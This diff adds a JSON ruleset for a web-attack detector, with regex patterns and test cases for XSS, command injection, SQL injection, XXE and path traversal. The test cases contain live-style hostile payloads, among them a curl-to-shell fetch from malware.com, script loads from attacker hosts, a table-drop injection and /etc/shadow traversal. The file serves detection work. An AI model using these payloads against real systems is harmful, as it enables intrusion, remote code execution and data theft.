@@ -1,0 +1,467 @@
+{
+  "version": "20171205",
+  "sensors": {
+    "xss": {
+      "patterns": [
+        {
+          "title": "Basic Injection",
+          "sophistication": 1,
+          "common": "(?:<(script|iframe|embed|frame|frameset|object|img|applet|body|html|style|layer|link|ilayer|meta|bgsound))",
+          "tests": {
+            "shouldFind": [
+              "\n\n<scRipT>document.write(1)</script>",
+              "<body onload=\"abc\">",
+              "<script>alert(123)</script>",
+              "<script>alert(\"hellox world\");</script>",
+              "9<script/src=http/attacker.com>"
+            ],
+            "shouldIgnore": [
+              "<h1>hi</h1>",
+              "Bob",
+              "Script"
+            ]
+          },
+          "id": "1"
+        },
+        {
+          "title": "Alert or Event XSS",
+          "sophistication": 2,
+          "common": "(?:(alert|on\\w+\\s*=|function\\s+\\w+)\\s*\\(\\s*(['+\\d\\w](,?\\s*['+\\d\\w]*)*)*\\s*\\))",
+          "tests": {
+            "shouldFind": [
+              "<input onmouseover='alert(1)'>",
+              "<input/onmouseover='alert(1)'>"
+            ],
+            "shouldIgnore": [
+              "Email de la personne (action du front)",
+              "<h1>hi</h1>",
+              "()",
+              "Bob",
+              "Sammy"
+            ]
+          },
+          "id": "2"
+        },
+        {
+          "title": "Attribute Breaks",
+          "sophistication": 3,
+          "common": "(?:\"+.*[<=]\\s*\"[^\"]+\")|(?:\"\\s*\\w+\\s*=)|(?:>\\w=/)|(?:#.+\\)[\"\\s]*>)|(?:\"\\s*(?:src|style|on\\w+)\\s*=\\s*\")|(?:[^\"]?\"[,;\\s]+\\w*[\\[\\(])(?:^>[\\w\\s]*</?\\w{2,}>)",
+          "tests": {
+            "shouldFind": [
+              "<input src=\"b\" onmouseover=\"alert(1)\" test=\"abc\">"
+            ],
+            "shouldIgnore": [
+              "<h1>hi</h1>",
+              "<i class=\"test\">test</i>",
+              "Bob",
+              "Sammy",
+              "<i>",
+              "onmouseover",
+              "\"alert(1)\""
+            ]
+          },
+          "id": "4"
+        },
+        {
+          "title": "Basic Obfuscation",
+          "sophistication": 3,
+          "common": "(?:[\".]script\\s*\\()|(?:\\$\\$?\\s*\\(\\s*[\\w\"])|(?:/[\\w\\s]+/\\.)|(?:=\\s*/\\w+/\\s*\\.)|(?:(?:this|window|top|parent|frames|self|content)\\[\\s*[(,\"]*\\s*[\\w\\$])|(?:,\\s*new\\s+\\w+\\s*[,;)])",
+          "tests": {
+            "shouldFind": [
+              ",YAHOO.util.Get.script(\"http://ha.ckers.org/xss.js\")"
+            ],
+            "shouldIgnore": [
+              "<h1>hi</h1>",
+              "<i class=\"test\">test</i>",
+              "Bob",
+              "Sammy",
+              "<i>",
+              "onmouseover",
+              "\"alert(1)\""
+            ]
+          },
+          "id": "5"
+        },
+        {
+          "title": "Common Concatenation",
+          "sophistication": 3,
+          "common": "(?:=\\s*\\w+\\s*\\+\\s*\")|(?:\\+=\\s*\\(\\s\")|(?:!+\\s*[\\d.,]+\\w?\\d*\\s*\\?)|(?:=\\s*\\[\\s*\\])|(?:\"\\s*\\+\\s*\")|(?:[^\\s]\\[\\s*\\d+\\s*\\]\\s*[;+])|(?:\"\\s*[&|]+\\s*\")|(?:/\\s*\\?\\s*\")|(?:/\\s*\\)\\s*\\[)|(?:\\d\\?.+:\\d)|(?:\\]\\s*\\[\\W*\\w)",
+          "tests": {
+            "shouldFind": [
+              "=a+\"",
+              "+=( \"",
+              "! 1,000.0a?",
+              "= [ ]",
+              "\" + \"",
+              "#[ 1 ] ;",
+              "^[ 1 ] +",
+              "\" & \"",
+              "\" || \"",
+              "/ ? \"",
+              "/ ) [",
+              "1?a:1",
+              "] [$a",
+              "= werewr + \""
+            ],
+            "shouldIgnore": [
+              "<h1>hi</h1>",
+              "<i class=\"test\">test</i>",
+              "Bob",
+              "Sammy",
+              "<i>",
+              "onmouseover",
+              "http://127.0.0.1:4000/contrib?file=/etc/passwd",
+              "e=/",
+              "\"alert(1)\""
+            ]
+          },
+          "id": "6"
+        },
+        {
+          "title": "IFrame Tag Injection",
+          "sophistication": 1,
+          "common": "<iframe.*",
+          "tests": {
+            "shouldFind": [
+              "Sam\n<h3><iframe/src=\\\\malware.xcc/>"
+            ],
+            "shouldIgnore": [
+              "<h1>hi</h1>",
+              "Bob",
+              "Script"
+            ]
+          },
+          "id": "7"
+        },
+        {
+          "title": "JavaScript URL",
+          "sophistication": 1,
+          "common": "\\b(src|href|lowsrc|url|content)\\b\\W*?\\bjavascript:",
+          "tests": {
+            "shouldFind": [
+              "\" href=\"javascript:alert(1)\"",
+              "' url='javascript:alert(1)'",
+              "<input type=image src=javascript:",
+              "<meta http-equiv=\"refresh\" content=\"javascript:..."
+            ],
+            "shouldIgnore": [
+              "<h1>hi</h1>",
+              "Bob",
+              "Script"
+            ]
+          },
+          "id": "8"
+        }
+      ]
+    },
+    "cmdi": {
+      "safe_pattern": "^[a-zA-Z0-9_\\s\\r\\n\\t]*$",
+      "patterns": [
+        {
+          "title": "Common Remote Attempts",
+          "sophistication": 2,
+          "id": "1",
+          "common": "(?:[;\\|`]\\W*?\\bcc|[&\\|;]\\W*\\b\\b(wget|curl))\\b|/cc(?:['\"\\|;`\\-\\s]|$)",
+          "tests": {
+            "shouldFind": [
+              "|wget https://malware.com",
+              "& curl https://malware.com/run_me.sh|sh"
+            ],
+            "shouldIgnore": [
+              "curl/7.54.0",
+              "Wget/1.17.1 (linux-gnu)",
+              "aB--D_C=",
+              "union soldier",
+              "a",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2",
+              "divide and conquer"
+            ]
+          }
+        },
+        {
+          "title": "Common Command Attempts",
+          "sophistication": 1,
+          "id": "2",
+          "common": "(?:\\b(?:(?:n(?:et(?:\\b\\W+?\\blocalgroup|\\.exe)|(?:map|c)\\.exe)|t(?:racer(?:oute|t)|elnet\\.exe|clsh8?|ftp)|(?:w(?:guest|sh)|rcmd|ftp)\\.exe|echo\\b\\W*?\\by+)\\b|c(?:md(?:(?:\\.exe|32)\\b|\\b\\W*?/c)|d(?:\\b\\W*?[\\\\/]|\\W*?\\.\\.)|hmod.{0,40}?\\+.{0,3}x))|[;\\|`]\\W*?\\b(?:(?:c(?:h(?:grp|mod|own|sh)|md|pp)|p(?:asswd|ython|erl|ing|s)|ruby|node|n(?:asm|map|c)|f(?:inger|tp)|(?:kil|mai)l|(?:xte)?rm|ls(?:of)?|telnet|uname|echo|id)\\b|g(?:\\+\\+|cc\\b)))",
+          "tests": {
+            "shouldFind": [
+              "test|echo hi",
+              "abc;nc",
+              "`ls /etc/passwd`",
+              "`python /my/code`",
+              "`ruby /my/code`",
+              "`node /my/code`"
+            ],
+            "shouldIgnore": [
+              "aB--D_C=",
+              "union soldier",
+              "a",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "divide and conquer",
+              "david;bob",
+              "python",
+              "ruby",
+              "node"
+            ]
+          }
+        },
+        {
+          "title": "XML Injection Attempts",
+          "sophistication": 1,
+          "id": "3",
+          "common": "<\\?xml.*<!ENTITY",
+          "tests": {
+            "shouldFind": [
+              "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///dev/random\" >]><foo>&xxe;</foo>"
+            ],
+            "shouldIgnore": [
+              "aB--D_C=",
+              "union soldier",
+              "a",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "divide and conquer",
+              "david;bob",
+              "python",
+              "ruby",
+              "node"
+            ]
+          }
+        }
+      ]
+    },
+    "sqli": {
+      "safe_pattern": "^[a-zA-Z0-9_\\s\\r\\n\\t]*$",
+      "patterns": [
+        {
+          "title": "Common Encoding Obfuscations",
+          "sophistication": 3,
+          "common": "(?:(?:\\d[\"'`\u00b4\u2019\u2018]\\s+[\"'`\u00b4\u2019\u2018]\\s+\\d)|(?:^admin\\s*?[\"'`\u00b4\u2019\u2018]|(/\\*)+[\"'`\u00b4\u2019\u2018]+\\s?(?:--|#|/\\*|\\{)?)|(?:[\"'`\u00b4\u2019\u2018]\\s*?\\b(x?or|div|like|between|and)\\b\\s*?[+<>=(),-]\\s*?[\\d\"'`\u00b4\u2019\u2018])|(?:[\"'`\u00b4\u2019\u2018]\\s*?[^\\w\\s]?=\\s*?[\"'`\u00b4\u2019\u2018])|(?:[\"'`\u00b4\u2019\u2018]\\W*?[+=]+\\W*?[\"'`\u00b4\u2019\u2018])|(?:[\"'`\u00b4\u2019\u2018]\\s*?[!=|][\\d\\s!=+-]+.*?[\"'`\u00b4\u2019\u2018(].*?$)|(?:[\"'`\u00b4\u2019\u2018]\\s*?[!=|][\\d\\s!=]+.*?\\d+$)|(?:[\"'`\u00b4\u2019\u2018]\\s*?like\\W+[\\w\"'`\u00b4\u2019\u2018(])|(?:\\sis\\s*?0\\W)|(?:where\\s[\\s\\w\\.,-]+\\s=)|(?:[\"'`\u00b4\u2019\u2018][<>~]+[\"'`\u00b4\u2019\u2018]))",
+          "tests": {
+            "shouldFind": [
+              "') or ('1'='1--",
+              "') or ('1'='1--",
+              "1 OR '1'!=0",
+              "aa' LIKE md5(1) or '1"
+            ],
+            "shouldIgnore": [
+              "aB--D_C=",
+              "union soldier",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "divide and conquer"
+            ]
+          },
+          "id": "1"
+        },
+        {
+          "title": "Common Probes/Executions",
+          "sophistication": 1,
+          "common": "\\b(?:having)\\b\\s+(\\d{1,10}|'[^=]{1,10}')\\s*?[=<>]|(?:\\bexecute(\\s{1,5}[\\w\\.$]{1,5}\\s{0,3})?\\()|\\bhaving\\b ?(?:\\d{1,10}|['\"][^=]{1,10}['\"]) ?[=<>]+|(?:\\bcreate\\s+?table.{0,20}?\\()|(?:\\blike\\W*?char\\W*?\\()|(?:(?:(select(.*?)case|from(.*?)limit|order\\sby)))|exists\\s(\\sselect|select\\Sif(null)?\\s\\(|select\\Stop|select\\Sconcat|system\\s\\(|\\b(?:having)\\b\\s+(\\d{1,10})|'[^=]{1,10}')",
+          "id": "2"
+        },
+        {
+          "title": "Conditional Attempts",
+          "sophistication": 3,
+          "common": "(?:[\\s()]case\\s*\\()|(?:\\)\\s*like\\s*\\()|(?:having\\s*[^\\s]+\\s*[^\\w\\s])|(?:if\\s?\\([\\d\\w]\\s*[=<>~])",
+          "tests": {
+            "shouldFind": [
+              "' or id= 1 having 1 #1 !"
+            ],
+            "shouldIgnore": [
+              "aB--D_C=",
+              "union soldier",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "divide and conquer"
+            ]
+          },
+          "id": "7"
+        },
+        {
+          "title": "Union Attempts",
+          "sophistication": 3,
+          "common": "(?:union\\s*(?:all|distinct|[(!@]*)\\s*[(\\[]*\\s*select)|(?:\\w+\\s+like\\s+\")|(?:like\\s*\"%)|(?:\"\\s*like\\W*[\"\\d])|(?:\"\\s*(?:n?and|x?or|not |\\|\\||\\&\\&)\\s+[\\s\\w]+=\\s*\\w+\\s*having)|(?:\"\\s*\\*\\s*\\w+\\W+\")|(?:select\\s*[\\[\\]()\\s\\w\\.,\"-]+from)|(?:find_in_set\\s*\\()",
+          "tests": {
+            "shouldFind": [
+              "'union select all 1,2,x,x,x,x —-",
+              "'union select 1,2,3,x,x,x,x,@@version,x–-",
+              "'union select UTL_INADDR.get_host_address,null,null,null,null from dual–-"
+            ],
+            "shouldIgnore": [
+              "aB--D_C=",
+              "union soldier",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "divide and conquer"
+            ]
+          },
+          "id": "8"
+        },
+        {
+          "title": "SQL Comment Sequence",
+          "sophistication": 1,
+          "common": "([';]--|--[\\s\\r\\n\\v\\f]|(?:'[\\s\\r\\n\\v\\f]*--[^-]*?-)|#[\\s\\r\\n\\v\\f]*$|;?\\\\x00)",
+          "tests": {
+            "shouldFind": [
+              "'--",
+              "1=1;\\x00",
+              "admin\" #"
+            ],
+            "shouldIgnore": [
+              "aB--D_C=",
+              "union soldier",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "-----BEGIN PGP PUBLIC KEY BLOCK-----",
+              "divide and conquer",
+              "Order ID# 2345",
+              "/url/with/#/hash"
+            ]
+          },
+          "id": "3"
+        },
+        {
+          "title": "Extraction Attempts",
+          "sophistication": 1,
+          "common": "(?:(?:@.+=\\s*?\\(\\s*?select)|(?:\\d+\\s*?(x?or|div|like|between|and)\\s*?\\d+\\s*?[\\-+])|(?:/\\w+;?\\s+(?:having|and|x?or|div|like|between|and|select)\\W)|(?:\\d\\s+group\\s+by.+\\()|(?:(?:;|#|--)\\s*?(?:drop|alter))|(?:(?:;|#|--)\\s*?(?:update|insert)\\s*?\\w{2,})|(?:[^\\w]SET\\s*?@\\w+)|(?:(?:n?and|x?x?or|div|like|between|and|not |\\|\\||\\&\\&)[\\s(]+\\w+[\\s)]*?[!=+]+[\\s\\d]*?[\"'`\u00b4\u2019\u2018=()]))",
+          "tests": {
+            "shouldFind": [
+              "';Drop table users"
+            ],
+            "shouldIgnore": [
+              "aB--D_C=",
+              "union soldier",
+              "select",
+              "James O'Connor",
+              "Like this or that",
+              "divide and conquer",
+              "Sam; James"
+            ]
+          },
+          "id": "4"
+        }
+      ]
+    },
+    "fpt": {
+      "patterns": [
+        {
+          "title": "General Traversal",
+          "sophistication": 2,
+          "common": "(?:(?:/|\\\\)?\\.+(/|\\\\)(?:\\.*))|(?:\\w+\\.exe\\??\\s)|(?:;\\s*\\w+\\s*/[\\w*-]+/)|(?:\\d\\.\\dx\\|)|(?:%(?:c0\\.|af\\.|5c\\.))|(?:/(?:%2e){2})",
+          "tests": {
+            "shouldFind": [
+              "/.../.../.../.../.../",
+              "\\0../../../../../../etc/passwd",
+              "../../../../../../etc/shadow"
+            ],
+            "shouldIgnore": [
+              "Julie",
+              "The quick'o brown... fox.. was. /there"
+            ]
+          },
+          "id": "1"
+        },
+        {
+          "title": "Common System Probing",
+          "sophistication": 4,
+          "common": "(?:%c0%ae/)|(?:(?:/|\\\\)(conf|usr|etc|proc|opt|s?bin|local|dev|tmp|kern|[br]oot|sys|system|windows|winnt|program|%[a-z_-]{3,}%)(?:/|\\\\))|(?:(?:/|\\\\)inetpub|localstart\\.asp|boot\\.ini)",
+          "tests": {
+            "shouldFind": [
+              "/./././././././././././boot.ini",
+              "/home/apache/conf/httpd.conf"
+            ],
+            "shouldIgnore": [
+              "/Home/Index",
+              "Julie",
+              "The quick'o brown... fox.. was. /there"
+            ]
+          },
+          "id": "2"
+        },
+        {
+          "title": "Attempt for /etc/passwd, shadow",
+          "sophistication": 1,
+          "common": "(?:etc/\\W*passwd)|(?:etc/\\W*shadow)",
+          "tests": {
+            "shouldFind": [
+              "/etc/passwd"
+            ],
+            "shouldIgnore": [
+              "Julie",
+              "The quick'o brown... fox.. was. /there"
+            ]
+          },
+          "id": "3"
+        },
+        {
+          "title": "Spider svn entries disclosure",
+          "sophistication": 1,
+          "common": ".svn/(./)*entries",
+          "tests": {
+            "shouldFind": [
+              "http://mysite.tld/folder/.svn/entries",
+              "http://mysite.tld/folder/.svn/./entries"
+            ],
+            "shouldIgnore": [
+              "mysite.tld/folder/entries/svn/"
+            ]
+          },
+          "id": "4"
+        }
+      ]
+    },
+    "nullbyte": {
+      "patterns": [
+        {
+          "title": "Any Null Byte",
+          "sophistication": 1,
+          "id": "1",
+          "common": "\\x00",
+          "tests": {
+            "shouldFind": [
+              "Duh\u0000",
+              "\u0000",
+              "\n\rOh\u0000No"
+            ],
+            "shouldIgnore": [
+              "Julie",
+              "The quick'o brown... fox.. was. /there"
+            ]
+          }
+        }
+      ]
+    },
+    "retr": {
+      "patterns": [
+        {
+          "title": "Any Line-Break Character",
+          "sophistication": 1,
+          "id": "1",
+          "common": "(\\n|\\r)",
+          "tests": {
+            "shouldFind": [
+              "Duh\r",
+              "\r\n",
+              "\n\rOh\\0No"
+            ],
+            "shouldIgnore": [
+              "Julie",
+              "The quick'o brown... fox.. was. /there"
+            ]
+          }
+        }
+      ]
+    }
+  }
+}
